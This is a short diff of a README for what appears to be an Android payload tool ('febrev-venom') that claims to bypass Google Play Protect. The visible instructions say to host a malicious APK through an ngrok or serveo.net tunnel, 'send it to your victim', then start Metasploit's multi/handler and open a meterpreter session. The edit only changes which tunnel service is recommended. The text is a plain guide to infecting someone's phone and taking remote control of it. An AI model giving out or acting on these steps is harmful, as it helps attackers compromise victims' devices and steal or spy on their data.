@@ -24,7 +24,7 @@ CAN BYPASS GOOGLE PLAY PROTECT.............
    python3 febrev-venom.py
    
    
- **use the ngrok link + /<your_apk.apk> or pagekite link + /<your apk> and send it to your victim 
+ **use the ngrok link + /<your_apk.apk> or serveo.net link(the best) + /<your apk> and send it to your victim 
  then start your msfconsole 
  use exploit/multi/handler
  then set lhost and lport and start the meterpreter session
